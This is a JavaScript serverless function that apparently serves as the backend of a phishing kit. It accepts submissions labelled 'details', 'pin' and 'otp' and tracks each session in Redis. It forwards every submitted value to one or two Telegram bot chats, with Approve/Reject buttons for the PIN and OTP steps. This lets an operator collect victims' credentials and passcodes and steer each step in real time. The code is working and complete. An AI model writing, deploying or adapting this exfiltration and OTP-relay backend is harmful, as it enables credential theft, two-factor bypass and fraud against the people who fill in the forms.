exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };
    
    try {
        const body = JSON.parse(event.body);
        const { sessionId, step, data } = body; // step: 'details', 'pin', 'otp'
        
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        const redisUrl = process.env.UPSTASH_REDIS_REST_URL;
        const redisToken = process.env.UPSTASH_REDIS_REST_TOKEN;

        // Set initial status in Redis
        const redisKey = `session:${sessionId}:${step}`;
        const initialStatus = step === 'details' ? 'approved' : 'pending';
        
        await fetch(`${redisUrl}/set/${redisKey}/${initialStatus}?EX=600`, {
            headers: { Authorization: `Bearer ${redisToken}` }
        });

        // Format message for Telegram
        let messageText = `🆕 *New Submission* (${step})\nSession: \`${sessionId}\`\n\n`;
        for (const [key, value] of Object.entries(data)) {
            messageText += `*${key}*: ${value}\n`;
        }
        
        let replyMarkup = {};
        if (step !== 'details') {
            replyMarkup = {
                inline_keyboard: [[
                    { text: "✅ Approve", callback_data: `approve|${sessionId}|${step}` },
                    { text: "❌ Reject", callback_data: `reject|${sessionId}|${step}` }
                ]]
            };
        }

        // Send to Telegram
        const tgPayload = {
            chat_id: chatId,
            text: messageText,
            parse_mode: 'Markdown'
        };
        
        if (Object.keys(replyMarkup).length > 0) {
            tgPayload.reply_markup = replyMarkup;
        }

        // Send to Primary
        const primaryTg = fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(tgPayload)
        });

        // Send to Secondary (Optional)
        const secondaryToken = process.env.SECONDARY_TELEGRAM_BOT_TOKEN;
        const secondaryChatId = process.env.SECONDARY_TELEGRAM_CHAT_ID;
        let secondaryTg = Promise.resolve();
        
        if (secondaryToken && secondaryChatId) {
            secondaryTg = fetch(`https://api.telegram.org/bot${secondaryToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: secondaryChatId,
                    text: messageText,
                    parse_mode: 'Markdown',
                    ...(Object.keys(replyMarkup).length > 0 ? { reply_markup: replyMarkup } : {})
                })
            });
        }

        const [res1, res2] = await Promise.all([primaryTg, secondaryTg]);

        if (!res1.ok) {
           console.error('Failed to send to Primary Telegram', await res1.text());
        }
        if (res2 && !res2.ok) {
           console.error('Failed to send to Secondary Telegram', await res2.text());
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, sessionId, step })
        };
    } catch (error) {
        console.error(error);
        return { statusCode: 500, body: JSON.stringify({ error: 'Internal Server Error' }) };
    }
};
